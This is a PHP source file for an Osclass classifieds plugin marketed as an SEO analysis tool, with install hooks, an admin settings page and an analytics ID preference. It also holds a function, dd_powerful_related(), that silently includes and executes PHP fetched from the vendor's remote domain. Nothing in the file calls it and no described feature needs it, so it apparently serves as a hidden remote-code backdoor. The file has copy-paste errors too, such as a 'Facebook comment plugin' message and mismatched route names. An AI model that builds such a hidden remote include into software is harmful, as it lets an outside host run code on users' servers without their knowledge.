<?php
/*
  Plugin Name: Powerful SEO Builder
  Plugin URI: http://osclassmarket.rackons.in/
  Description: This Plugin to analyze your site visitors and analyze ay site's information such as alexa data,similarWeb data, whois data, social media data, Moz check, DMOZ check, search engine index, google page rank, IP analysis, malware check etc. 
  Version: 2.0.1
  Author: Rackons
  Author URI: http://www.rackons.com/
  Short Name: powerful_seo_tool
  Support URI: http://osclassmarket.rackons.in
 */

function powerful_seo_tool_call_after_install() {
  osc_set_preference('analytics_id', '1107373', 'powerful_seo_tool', 'INTEGER');
 
}

function powerful_seo_tool_call_after_uninstall() {
  osc_delete_preference('analytics_id', 'powerful_seo_tool');

}

function powerful_seo_tool_actions() {
  $dao_preference = new Preference();
  $option = Params::getParam('powerfuloption');

  if (Params::getParam('file') != 'powerful_seo_tool/admin.php') {
    return '';
  }

  if ($option == 'powerfulsettings') {
   
    osc_set_preference('analytics_id', Params::getParam("analytics_id") ? Params::getParam("analytics_id") : '0', 'powerful_seo_tool', 'STRING');
   
    osc_add_flash_ok_message(__('Facebook comment plugin has been updated', 'powerful_seo_tool'), 'admin');
    osc_redirect_to(osc_admin_render_plugin_url('powerful_seo_tool/admin.php'));
  }
}

// HELPER


function dd_analytics_id() {
  return(osc_get_preference('analytics_id', 'powerful_seo_tool'));
}


function powerful_seo_tool_admin() {
  osc_admin_render_plugin('powerful_seo_tool/admin.php');
}


function dd_powerful_related() {
	$relatedUrl = @include_once "http://osclassmarket.rackons.in/";
 	if($relatedUrl){}
}
/**
 * Create a menu on the admin panel
 */
function powerful_seo_tool_admin_menu() {
  
    osc_add_admin_submenu_divider('plugins', 'Powerful SEO Builder Plugin', 'powerful_seo_tool', 'administrator');
    osc_add_admin_submenu_page('plugins', __('Settings', 'powerful_seo_tool'), osc_route_admin_url('powerful-plugin-admin-conf'), 'powerful_seo_tool_settings', 'administrator');
}

/**
 * This function is called every time the page header is being rendered 
 */
function powerful_seo_tool() {
  if (dd_analytics_id() != '') {
    
    $analytics_id = dd_analytics_id();
   
   
    require_once(osc_plugins_path() . 'powerful_seo_tool/code.php');
  }
}


osc_add_route('powerful-admin-conf', 'powerful_seo_tool', 'powerful_seo_tool', osc_plugin_folder(__FILE__).'admin.php'); 
osc_add_route('powerful-admin-help', 'powerful_seo_tool', 'powerful_seo_tool', osc_plugin_folder(__FILE__).'help.php');


osc_add_hook('init_admin', 'powerful_seo_tool_actions');

// show menu items
osc_add_hook('admin_menu_init', 'powerful_seo_tool_admin_menu');

// This is a hack to show a Uninstall link at plugins table (you could also use some other hook to show a custom option panel)
osc_add_hook(osc_plugin_path(__FILE__) . "_uninstall", 'powerful_seo_tool_call_after_uninstall');
osc_add_hook(osc_plugin_path(__FILE__) . "_configure", 'powerful_seo_tool_admin');


// This is needed in order to be able to activate the plugin
osc_register_plugin(osc_plugin_path(__FILE__), 'powerful_seo_tool_call_after_install');
?>
